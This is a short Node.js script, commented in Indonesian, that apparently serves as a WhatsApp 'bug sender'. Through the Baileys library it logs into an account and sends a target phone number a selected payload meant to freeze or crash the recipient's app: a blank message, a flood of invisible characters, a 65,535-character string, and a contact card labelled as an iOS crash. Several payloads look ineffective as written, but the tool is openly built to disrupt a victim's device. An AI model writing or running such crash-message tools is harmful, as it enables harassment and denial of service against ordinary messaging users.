const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const fs = require('fs');
const path = require('path');

async function run(target, payload) {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info');
    const sock = makeWASocket({
        auth: state,
        printQRInTerminal: true,
        defaultQueryTimeoutMs: undefined,
        logger: require('pino')({ level: 'silent' })
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
            console.log('Connected!');

            // Payload bug berdasarkan pilihan
            let message;
            switch (payload) {
                case 'blank':
                    message = { text: '' }; // Blank chat
                    break;
                case 'medium':
                    // Delay medium invisible (contoh: kirim karakter khusus)
                    message = { text: '‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎' };
                    break;
                case 'hard':
                    // Delay hard (contoh kirim file besar karakter)
                    message = { text: 'A'.repeat(65535) };
                    break;
                case 'ios':
                    // Force iOS crash (contoh: kirim vcard rusak)
                    message = { contacts: { displayName: 'Crash', contacts: [{ vcard: 'BEGIN:VCARD\nVERSION:3.0\nN:Crash;Test\nEND:VCARD' }] } };
                    break;
                default:
                    message = { text: 'Test' };
            }

            try {
                await sock.sendMessage(target.replace(/\D/g,'') + '@s.whatsapp.net', message);
                console.log('Bug sent');
            } catch (e) {
                console.log('Send error:', e);
            }
        }

        if (connection === 'close') {
            const reason = lastDisconnect?.error?.output?.statusCode;
            if (reason !== DisconnectReason.loggedOut) run(target, payload); // Reconnect
        }
    });
}

module.exports = { run };
